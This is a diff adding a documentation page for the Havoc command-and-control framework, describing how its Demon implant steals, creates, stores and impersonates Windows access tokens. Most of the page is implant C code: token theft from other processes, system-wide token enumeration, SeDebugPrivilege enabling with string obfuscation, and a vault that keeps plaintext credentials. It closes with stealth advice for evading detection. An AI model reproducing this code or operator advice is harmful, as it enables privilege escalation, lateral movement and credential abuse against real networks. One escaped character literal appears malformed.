@@ -1,0 +1,539 @@
+---
+title: 'Token Management'
+description: 'Token vault system for stealing, impersonating, and managing Windows access tokens'
+icon: 'key'
+---
+
+## Overview
+
+Havoc implements a comprehensive token management system that allows operators to steal, store, and impersonate Windows access tokens. This enables privilege escalation, lateral movement, and operating under different security contexts.
+
+<Info>
+  The token vault maintains a linked list of stolen and created tokens that persist across commands, allowing operators to switch between security contexts on demand.
+</Info>
+
+## Token Vault Architecture
+
+The token vault is a linked list structure that stores token metadata:
+
+**Source**: `payloads/Demon/include/core/Token.h:80`
+
+```c
+typedef struct _TOKEN_LIST_DATA {
+    HANDLE  Handle;           // Token handle
+    LPWSTR  DomainUser;       // DOMAIN\User format
+    DWORD   dwProcessID;      // Source process (for stolen tokens)
+    SHORT   Type;             // TOKEN_TYPE_STOLEN or TOKEN_TYPE_MAKE_NETWORK
+    
+    // For make_token credentials
+    LPWSTR  lpUser;
+    LPWSTR  lpPassword;
+    LPWSTR  lpDomain;
+    
+    struct _TOKEN_LIST_DATA* NextToken;  // Linked list
+} TOKEN_LIST_DATA, *PTOKEN_LIST_DATA;
+```
+
+## Token Operations
+
+### Stealing Tokens
+
+Tokens can be stolen from running processes using `NtOpenProcessToken` or `NtDuplicateObject`:
+
+**Source**: `payloads/Demon/src/core/Token.c:414`
+
+```c
+HANDLE TokenSteal(IN DWORD ProcessID, IN HANDLE TargetHandle) {
+    HANDLE hProcess  = NULL;
+    HANDLE hTokenDup = NULL;
+    
+    hProcess = ProcessOpen(ProcessID, 
+                          PROCESS_QUERY_INFORMATION | PROCESS_DUP_HANDLE);
+    
+    if (TargetHandle) {
+        // Steal a specific handle from the process
+        NtStatus = SysNtDuplicateObject(
+            hProcess, 
+            TargetHandle, 
+            NtCurrentProcess(), 
+            &hTokenDup, 
+            0, 0, 
+            DUPLICATE_SAME_ACCESS
+        );
+    } else {
+        // Steal the primary process token
+        NtStatus = SysNtOpenProcessToken(
+            hProcess, 
+            TOKEN_DUPLICATE | TOKEN_QUERY, 
+            &hTokenDup
+        );
+    }
+    
+    return hTokenDup;
+}
+```
+
+<Accordion title="Usage Example">
+```
+steal_token 1234
+```
+Steals the primary token from process ID 1234.
+</Accordion>
+
+### Make Token
+
+Create tokens from credentials using `LogonUserW`:
+
+**Source**: `payloads/Demon/src/core/Token.c:598`
+
+```c
+HANDLE TokenMake(LPWSTR User, LPWSTR Password, LPWSTR Domain, 
+                 DWORD LogonType) {
+    HANDLE hToken = NULL;
+    
+    // Revert to self before creating new token
+    if (!TokenRevSelf()) {
+        PRINTF("Failed to revert to self: Error:[%d]\n", NtGetLastError());
+    }
+    
+    if (!Instance->Win32.LogonUserW(
+        User, 
+        Domain, 
+        Password, 
+        LogonType,
+        LogonType == LOGON32_LOGON_NEW_CREDENTIALS 
+            ? LOGON32_PROVIDER_WINNT50 
+            : LOGON32_PROVIDER_DEFAULT,
+        &hToken
+    )) {
+        PUTS("LogonUserW: Failed");
+        PACKAGE_ERROR_WIN32;
+    }
+    
+    return hToken;
+}
+```
+
+**Logon Types**:
+- `LOGON32_LOGON_NEW_CREDENTIALS` (9): Network credentials only (like `runas /netonly`)
+- `LOGON32_LOGON_INTERACTIVE` (2): Full interactive logon
+- `LOGON32_LOGON_NETWORK` (3): Network logon
+
+### Token Duplication
+
+Tokens are duplicated to create impersonation tokens:
+
+**Source**: `payloads/Demon/src/core/Token.c:37`
+
+```c
+BOOL TokenDuplicate(
+    IN  HANDLE        TokenOriginal,
+    IN  DWORD         Access,
+    IN  SEC_IMP_LEVEL ImpersonateLevel,
+    IN  TOKEN_TYPE    TokenType,
+    OUT PHANDLE       TokenNew
+) {
+    OBJECT_ATTRIBUTES   ObjAttr = {0};
+    SEC_QUALITY_SERVICE Sqos    = {0};
+    
+    Sqos.Length              = sizeof(SEC_QUALITY_SERVICE);
+    Sqos.ImpersonationLevel  = ImpersonateLevel;
+    Sqos.ContextTrackingMode = 0;
+    Sqos.EffectiveOnly       = FALSE;
+    
+    InitializeObjectAttributes(&ObjAttr, NULL, 0, NULL, NULL);
+    ObjAttr.SecurityQualityOfService = &Sqos;
+    
+    // Use indirect syscall for duplication
+    if (!NT_SUCCESS(SysNtDuplicateToken(
+        TokenOriginal, 
+        Access, 
+        &ObjAttr, 
+        FALSE, 
+        TokenType, 
+        TokenNew
+    ))) {
+        return FALSE;
+    }
+    
+    return TRUE;
+}
+```
+
+## Impersonation
+
+Tokens are applied to the current thread using `NtSetInformationThread`:
+
+**Source**: `payloads/Demon/src/core/Token.c:1281`
+
+```c
+BOOL SysImpersonateLoggedOnUser(HANDLE hToken) {
+    SECURITY_QUALITY_OF_SERVICE Qos = {0};
+    OBJECT_ATTRIBUTES ObjectAttributes = {0};
+    HANDLE NewToken = NULL;
+    TOKEN_TYPE Type = 0;
+    
+    // Get token type
+    SysNtQueryInformationToken(
+        hToken, TokenType, &Type, 
+        sizeof(TOKEN_TYPE), &ReturnLength
+    );
+    
+    if (Type == TokenPrimary) {
+        // Duplicate as impersonation token
+        Qos.Length = sizeof(SECURITY_QUALITY_OF_SERVICE);
+        Qos.ImpersonationLevel = SecurityImpersonation;
+        Qos.ContextTrackingMode = SECURITY_DYNAMIC_TRACKING;
+        Qos.EffectiveOnly = FALSE;
+        
+        SysNtDuplicateToken(
+            hToken,
+            TOKEN_IMPERSONATE | TOKEN_QUERY,
+            &ObjectAttributes,
+            FALSE,
+            TokenImpersonation,
+            &NewToken
+        );
+    } else {
+        NewToken = hToken;
+    }
+    
+    // Apply token to current thread
+    Status = SysNtSetInformationThread(
+        NtCurrentThread(),
+        ThreadImpersonationToken,
+        &NewToken,
+        sizeof(HANDLE)
+    );
+    
+    return NT_SUCCESS(Status);
+}
+```
+
+### Reverting Impersonation
+
+Remove thread impersonation:
+
+**Source**: `payloads/Demon/src/core/Token.c:74`
+
+```c
+BOOL TokenRevSelf(VOID) {
+    HANDLE Token = NULL;
+    NTSTATUS NtStatus = STATUS_SUCCESS;
+    
+    // Set thread token to NULL (revert to process token)
+    if (!NT_SUCCESS(SysNtSetInformationThread(
+        NtCurrentThread(), 
+        ThreadImpersonationToken, 
+        &Token, 
+        sizeof(HANDLE)
+    ))) {
+        return FALSE;
+    }
+    
+    return TRUE;
+}
+```
+
+## Privilege Management
+
+Havoc can enable/disable token privileges:
+
+**Source**: `payloads/Demon/src/core/Token.c:203`
+
+```c
+BOOL TokenSetPrivilege(IN LPSTR Privilege, IN BOOL Enable) {
+    TOKEN_PRIVILEGES TokenPrivileges = {0};
+    LUID TokenLUID = {0};
+    HANDLE hToken = NULL;
+    
+    if (!Instance->Win32.LookupPrivilegeValueA(
+        NULL, Privilege, &TokenLUID
+    )) {
+        return FALSE;
+    }
+    
+    TokenPrivileges.PrivilegeCount = 1;
+    TokenPrivileges.Privileges[0].Luid = TokenLUID;
+    TokenPrivileges.Privileges[0].Attributes = 
+        Enable ? SE_PRIVILEGE_ENABLED : 0;
+    
+    SysNtOpenProcessToken(
+        NtCurrentProcess(), TOKEN_ALL_ACCESS, &hToken
+    );
+    
+    if (!Instance->Win32.AdjustTokenPrivileges(
+        hToken, FALSE, &TokenPrivileges, 0, NULL, NULL
+    )) {
+        return FALSE;
+    }
+    
+    return TRUE;
+}
+```
+
+### Common Privileges
+
+<Accordion title="SeDebugPrivilege">
+**Source**: `payloads/Demon/src/core/Token.c:240`
+
+Enables opening handles to any process:
+```c
+BOOL TokenSetSeDebugPriv(IN BOOL Enable) {
+    CHAR PrivName[17] = {0};
+    // Obfuscated "SeDebugPrivilege"
+    PrivName[2] = HideChar('D');
+    PrivName[9] = HideChar('i');
+    // ... (obfuscation for OPSEC)
+    return TokenSetPrivilege(PrivName, Enable);
+}
+```
+</Accordion>
+
+<Accordion title="SeImpersonatePrivilege">
+**Source**: `payloads/Demon/src/core/Token.c:271`
+
+Required for impersonating tokens:
+```c
+BOOL TokenSetSeImpersonatePriv(IN BOOL Enable) {
+    CHAR PrivName[23] = {0};
+    // Obfuscated "SeImpersonatePrivilege"
+    return TokenSetPrivilege(PrivName, Enable);
+}
+```
+</Accordion>
+
+## Token Enumeration
+
+Havoc can enumerate all accessible tokens on the system:
+
+**Source**: `payloads/Demon/src/core/Token.c:1130`
+
+```c
+BOOL ListTokens(PUSER_TOKEN_DATA* pTokens, PDWORD pNumTokens) {
+    PSYSTEM_HANDLE_INFORMATION handleTableInformation = NULL;
+    PPROCESS_LIST ProcessList = NULL;
+    
+    // Enable SeDebugPrivilege
+    TokenSetSeDebugPriv(TRUE);
+    
+    // Get the object type index for "Token"
+    GetTypeIndexToken(&TokenTypeIndex);
+    
+    // Get all system handles
+    GetAllHandles(&handleTableInformation, &handleTableInformationSize);
+    
+    // Extract unique process IDs
+    GetProcessesFromHandleTable(handleTableInformation, &ProcessList);
+    
+    // Loop through each process
+    for (ULONG i = 0; i < ProcessList->Count; i++) {
+        ProcessId = ProcessList->ProcessId[i];
+        
+        hProcess = ProcessOpen(ProcessId, 
+                              PROCESS_QUERY_INFORMATION | PROCESS_DUP_HANDLE);
+        
+        // Loop through handles in this process
+        for (ULONG j = 0; j < handleTableInformation->NumberOfHandles; j++) {
+            if (handleInfo->ObjectTypeIndex == TokenTypeIndex) {
+                // Duplicate the token
+                SysNtDuplicateObject(
+                    hProcess,
+                    handleInfo->HandleValue,
+                    NtCurrentProcess(),
+                    &hToken,
+                    0, 0,
+                    DUPLICATE_SAME_ACCESS
+                );
+                
+                // Process and store if valid
+                ProcessUserToken(hToken, ProcessId, handleInfo->HandleValue, 
+                               CheckUsername, &CurrentUser, Tokens, &NumTokens);
+            }
+        }
+    }
+}
+```
+
+### Token Validation
+
+**Source**: `payloads/Demon/src/core/Token.c:802`
+
+```c
+BOOL CanTokenBeImpersonated(IN HANDLE hToken) {
+    BOOL Success = FALSE;
+    HANDLE hImp = NULL;
+    
+    // Try to impersonate the token
+    if (!SysImpersonateLoggedOnUser(hToken))
+        return FALSE;
+    
+    // Try to open a handle to the current token
+    Success = Instance->Win32.OpenThreadToken(
+        NtCurrentThread(), MAXIMUM_ALLOWED, TRUE, &hImp
+    );
+    
+    TokenRevSelf();
+    
+    if (!Success)
+        return FALSE;
+    
+    // Verify it kept impersonation status
+    Success = IsImpersonationToken(hImp);
+    SysNtClose(hImp);
+    
+    return Success;
+}
+```
+
+## Token Metadata Extraction
+
+**Source**: `payloads/Demon/src/core/Token.c:103`
+
+```c
+BOOL TokenQueryOwner(
+    IN  HANDLE  Token,
+    OUT PBUFFER UserDomain,
+    IN  DWORD   Flags
+) {
+    PTOKEN_USER UserInfo = NULL;
+    ULONG UserSize = 0;
+    SID_NAME_USE SidType = 0;
+    
+    // Get TOKEN_USER structure
+    SysNtQueryInformationToken(Token, TokenUser, 
+                              UserInfo, 0, &UserSize);
+    UserInfo = MmHeapAlloc(UserSize);
+    SysNtQueryInformationToken(Token, TokenUser, 
+                              UserInfo, UserSize, &UserSize);
+    
+    // Convert SID to username and domain
+    Instance->Win32.LookupAccountSidW(
+        NULL, 
+        UserInfo->User.Sid, 
+        User,     &UserLen,
+        Domain,   &DomnLen,
+        &SidType
+    );
+    
+    // Format as DOMAIN\User
+    if (Flags == TOKEN_OWNER_FLAG_DEFAULT) {
+        UserDomain->Buffer[DomnLen * sizeof(WCHAR)] = '\\\';
+    }
+    
+    return TRUE;
+}
+```
+
+## OPSEC Considerations
+
+<Warning>
+**Detection Vectors**:
+
+1. **Handle Duplication**: Duplicating tokens from other processes generates `ObRegisterCallbacks` events
+2. **Token Enumeration**: Querying all system handles is highly anomalous
+3. **Impersonation Events**: Thread impersonation can trigger ETW events
+4. **Privilege Changes**: Enabling SeDebugPrivilege is a common IoC
+5. **Credential Use**: `LogonUserW` generates Windows Event ID 4624
+</Warning>
+
+### Stealth Recommendations
+
+1. **Targeted Stealing**: Only steal tokens from specific processes, not enumerate all
+2. **Legitimate Processes**: Target tokens from expected service accounts
+3. **Short Duration**: Minimize time spent impersonating
+4. **Clean Vault**: Remove tokens after use with `token clear`
+
+## Vault Management
+
+### Adding Tokens
+
+**Source**: `payloads/Demon/src/core/Token.c:323`
+
+```c
+DWORD TokenAdd(
+    IN HANDLE hToken,
+    IN LPWSTR DomainUser,
+    IN SHORT  Type,
+    IN DWORD  dwProcessID,
+    IN LPWSTR User,
+    IN LPWSTR Domain,
+    IN LPWSTR Password
+) {
+    PTOKEN_LIST_DATA TokenEntry = NULL;
+    DWORD TokenIndex = 0;
+    
+    TokenEntry = Instance->Win32.LocalAlloc(LPTR, sizeof(TOKEN_LIST_DATA));
+    TokenEntry->Handle      = hToken;
+    TokenEntry->DomainUser  = DomainUser;
+    TokenEntry->dwProcessID = dwProcessID;
+    TokenEntry->Type        = Type;
+    TokenEntry->lpUser      = User;
+    TokenEntry->lpDomain    = Domain;
+    TokenEntry->lpPassword  = Password;
+    TokenEntry->NextToken   = NULL;
+    
+    // Add to linked list
+    if (Instance->Tokens.Vault == NULL) {
+        Instance->Tokens.Vault = TokenEntry;
+        return 0;
+    }
+    
+    TokenList = Instance->Tokens.Vault;
+    while (TokenList->NextToken != NULL) {
+        TokenList = TokenList->NextToken;
+        TokenIndex++;
+    }
+    
+    TokenList->NextToken = TokenEntry;
+    return TokenIndex + 1;
+}
+```
+
+### Removing Tokens
+
+**Source**: `payloads/Demon/src/core/Token.c:474`
+
+Tokens are securely removed from the vault with memory zeroing:
+
+```c
+BOOL TokenRemove(DWORD TokenID) {
+    PTOKEN_LIST_DATA TokenItem = TokenGet(TokenID);
+    
+    // Revert if currently impersonating this token
+    if (Instance->Tokens.Impersonate && 
+        Instance->Tokens.Token->Handle == TokenItem->Handle) {
+        TokenImpersonate(FALSE);
+    }
+    
+    // Close handle
+    if (TokenItem->Handle) {
+        SysNtClose(TokenItem->Handle);
+    }
+    
+    // Zero and free all strings
+    if (TokenItem->DomainUser) {
+        MemSet(TokenItem->DomainUser, 0, 
+               StringLengthW(TokenItem->DomainUser) * sizeof(WCHAR));
+        Instance->Win32.LocalFree(TokenItem->DomainUser);
+    }
+    
+    // Zero structure and free
+    MemSet(TokenItem, 0, sizeof(TOKEN_LIST_DATA));
+    Instance->Win32.LocalFree(TokenItem);
+    
+    return TRUE;
+}
+```
+
+## Related Techniques
+
+- [Indirect Syscalls](/advanced/indirect-syscalls) - Used for all token operations
+- Process injection with stolen tokens
+- Kerberos ticket extraction and injection
+
+## References
+
+- Token implementation: `payloads/Demon/src/core/Token.c`
+- Header definitions: `payloads/Demon/include/core/Token.h`
+- Syscall usage: `payloads/Demon/src/core/Syscalls.c`
